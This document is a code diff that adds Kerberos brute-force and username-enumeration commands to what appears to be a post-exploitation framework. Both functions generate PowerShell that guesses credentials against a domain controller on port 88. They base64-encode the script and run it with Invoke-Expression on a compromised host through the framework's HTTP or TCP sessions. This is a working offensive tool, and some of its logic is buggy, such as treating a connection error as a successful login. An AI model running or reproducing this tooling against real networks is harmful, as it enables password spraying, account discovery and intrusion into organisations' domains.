@@ -1,4 +1,6 @@
 import base64
+import os
+import sys
 from core.session_handlers import session_manager
 from core import shell
 from colorama import Style, Fore
@@ -2115,3 +2117,250 @@ try {{
         else:
             out = out.replace("\\", "").replace("\\\\", "").replace("\\\\\\\\", "")
             return out
+
+def kerbrute_bruteforce(sid, user=None, password=None, domain=None, dc_ip=None, credfile=None):
+    """
+    kerbrute bruteforce -u <user|userfile> -p <pass|passfile> -d <domain> [--dc‑ip <ip>] [-C <credfile>]
+    -u: single user or file of users (comma‑list OK)
+    -p: single password or file of passwords (comma‑list OK)
+    -d: target AD domain (FQDN)
+    --dc‑ip: domain controller IP (required)
+    -C: local file or comma‑list of user:pass pairs
+    """
+    sess = session_manager.sessions.get(sid)
+    if not sess:
+        return brightred + "[!] Invalid session"
+    transport = sess.transport.lower()
+
+    # both domain and dc_ip must be provided
+    if not (domain and dc_ip):
+        return brightred + "[!] You must supply both -d <domain> and --dc-ip <ip>"
+
+    if not credfile:
+        if not (user and password):
+            return brightred + "[!] You must supply both -u and -p or -C to bruteforce!"
+
+    elif credfile and (user and password):
+        return brightred + "[!] You cannot use -C with -u and -p you must chose one mode!"
+
+    # build DNS‑to‑NetBIOS preamble
+    dns_preamble = connection_builder(dc_ip, domain)
+    if dns_preamble == "ERROR":
+        return brightred + "[!] Failed to resolve DC, use correct --dc-ip and -d flags"
+
+    # build list of user:pass pairs
+    if credfile:
+        if os.path.exists(credfile):
+            with open(credfile) as f:
+                raw_pairs = [l.strip() for l in f if l.strip()]
+        else:
+            raw_pairs = [p.strip() for p in credfile.split(",") if p.strip()]
+        pairs = raw_pairs
+    else:
+        # expand users
+        if os.path.exists(user or ""):
+            with open(user) as f:
+                users = [l.strip() for l in f if l.strip()]
+        else:
+            users = [u.strip() for u in (user or "").split(",") if u.strip()]
+        # expand passwords
+        if os.path.exists(password or ""):
+            with open(password) as f:
+                passes = [l.strip() for l in f if l.strip()]
+        else:
+            passes = [p.strip() for p in (password or "").split(",") if p.strip()]
+        # cartesian product
+        pairs = [f"{u}:{p}" for u in users for p in passes]
+
+    # escape each for PowerShell literal
+    escaped = [p.replace("'", "''") for p in pairs]
+    literal_pairs = ", ".join(f"'{p}'" for p in escaped)
+
+    ps = f"""
+$ErrorActionPreference = 'Stop'
+{dns_preamble}
+$Domain = '{domain}'
+
+# preload Kerberos types
+try {{ [Reflection.Assembly]::LoadWithPartialName('System.Net.Security') | Out-Null }} catch {{}}
+
+function Test-KerberosCred {{
+    param($User, $Pass)
+
+    # connect to KDC
+    $tcp    = New-Object System.Net.Sockets.TcpClient($nb, 88)
+    $stream = $tcp.GetStream()
+    $negot  = New-Object System.Net.Security.NegotiateStream($stream, $false)
+
+    try {{
+        Write-Host "Creating network credential"
+        $cred = New-Object System.Net.NetworkCredential($User, $Pass, $Domain)
+        $negot.AuthenticateAsClient($cred, "krbtgt/$Domain")
+        Write-Host "Auth succeeded returning true"
+        return $true
+    }}
+    catch [System.Security.Authentication.InvalidCredentialException] {{
+        Write-Host "Wrong password but account exists $User"
+        Write-Host "[$User] Exception message: $($_.Exception.Message)"
+        return $false
+    }}
+    catch [System.IO.IOException] {{
+        Write-Host "Invalid user $User"
+        Write-Host "[$User] Exception message: $($_.Exception.Message)"
+        return $true
+    }}
+    catch {{
+        Write-Host "An unknown exception ocurred"
+        Write-Host "[$User] Exception message: $($_.Exception.Message)"
+        return $false
+    }}
+    finally {{
+        if ($negot) {{ $negot.Dispose() }}
+        if ($tcp)   {{ $tcp.Close() }}
+    }}
+}}
+
+$pairs = @({literal_pairs})
+$found = $false
+foreach ($pair in $pairs) {{
+    $parts = $pair -split ':', 2
+    if (Test-KerberosCred $parts[0] $parts[1]) {{
+        Write-Output $pair
+        $found = $true
+    }}
+}}
+
+if (-not $found) {{ Write-Output "Nothing Found" }}
+"""
+
+    # Base64‐encode & dispatch
+    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
+    one_liner = (
+        "$ps = [System.Text.Encoding]::Unicode"
+        f".GetString([Convert]::FromBase64String(\"{b64}\")); "
+        "Invoke-Expression $ps"
+    )
+
+    if transport in ("http", "https"):
+        out = shell.run_command_http(sid, one_liner)
+
+    elif transport in ("tcp", "tls"):
+        out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)
+
+    else:
+        return brightred + "[!] Unknown session transport!"
+
+    if out:
+        if "Nothing Found" in out:
+            return brightred + "[!] No valid credentials found!"
+
+        else:
+            return out
+
+def kerbrute_userenum(sid, domain=None, dc_ip=None, user=None):
+    """
+    kerbrute userenum -d <domain> [--dc‑ip <ip>] -u <user|userfile|user1,user2>
+    -d: target AD domain (FQDN)
+    --dc‑ip: domain controller IP (optional)
+    -u: single username, comma‑list, or file of usernames
+    """
+    sess = session_manager.sessions.get(sid)
+    if not sess:
+        return brightred + "[!] Invalid session"
+    transport = sess.transport.lower()
+
+    if not (dc_ip and domain):
+        return brightred + "[!] You must use both --dc-ip and -d flags"
+
+    target = dc_ip or None
+    if target:
+        dns_preamble = connection_builder(dc_ip)
+        if dns_preamble == "ERROR":
+            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain correctly"
+
+    # build list of candidates locally
+    if os.path.exists(user or ""):
+        with open(user) as f:
+            raw = [l.strip() for l in f if l.strip()]
+        if len(raw) == 1 and ',' in raw[0]:
+            users = [u.strip() for u in raw[0].split(',') if u.strip()]
+        else:
+            users = raw
+    else:
+        users = [u.strip() for u in (user or "").split(',') if u.strip()]
+
+    escaped = [u.replace("'", "''") for u in users]
+    literal_users = ", ".join(f"'{u}'" for u in escaped)
+
+    ps = f"""
+$ErrorActionPreference = 'Stop'
+{dns_preamble}
+$Domain = '{domain}'
+
+# preload assemblies (harmless if not found)
+try {{ [Reflection.Assembly]::LoadWithPartialName('System.Net.Security') | Out-Null }} catch {{}}
+try {{ [Reflection.Assembly]::LoadWithPartialName('System')               | Out-Null }} catch {{}}
+
+function Test-KerberosUser {{
+    param($User, $Domain, $nb)
+
+    $tcp    = New-Object System.Net.Sockets.TcpClient($nb, 88)
+    $stream = $tcp.GetStream()
+    $negot  = New-Object System.Net.Security.NegotiateStream($stream, $false)
+
+    try {{
+        $cred = New-Object System.Net.NetworkCredential($User, '', $Domain)
+        $negot.AuthenticateAsClient($cred, "krbtgt/$Domain")
+        return $false
+    }}
+    catch [System.Security.Authentication.InvalidCredentialException] {{
+        # wrong password but valid user
+        return $true
+    }}
+    catch [System.IO.IOException] {{
+        return $false
+    }}
+    catch {{
+        return $false
+    }}
+    finally {{
+        if ($negot) {{ $negot.Dispose() }}
+        if ($tcp)   {{ $tcp.Close() }}
+    }}
+}}
+
+# enumerate
+$users = @({literal_users})
+foreach ($u in $users) {{
+    if (Test-KerberosUser -User $u -Domain $Domain -DC $DC) {{
+        Write-Output "Valid username found: $u"
+    }} else {{
+        Write-Output "Nothing Found"
+    }}
+}}
+"""
+
+    # inline Base64 + dispatch
+    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
+    one_liner = (
+        "$ps = [System.Text.Encoding]::Unicode"
+        f".GetString([Convert]::FromBase64String(\"{b64}\")); "
+        "Invoke-Expression $ps"
+    )
+    
+    if transport in ("http", "https"):
+        out = shell.run_command_http(sid, one_liner)
+
+    elif transport in ("tcp", "tls"):
+        out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)
+
+    else:
+        return brightred + "[!] Unknown session transport!"
+
+    if out:
+        if "Nothing Found" in out:
+            return brightred + "[!] No valid users found!"
+
+        else:
+            return out
+
